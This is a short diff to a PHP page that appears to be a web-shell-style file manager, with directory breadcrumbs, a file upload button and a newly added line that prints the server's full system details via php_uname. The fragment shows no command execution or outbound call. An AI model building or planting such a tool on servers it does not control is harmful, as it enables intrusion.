@@ -14,6 +14,7 @@
 </head>
 
 <body>
+    
 
     <?php
 
@@ -132,7 +133,10 @@
         }
         echo "'>" . $dir_part . "</a>/";
     }
-    echo ('
+    print ('
+</div>
+<div class="navbar-brand">
+'.php_uname("a").'
 </div>
 <div class="form-inline">
 <a href="?upxc&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
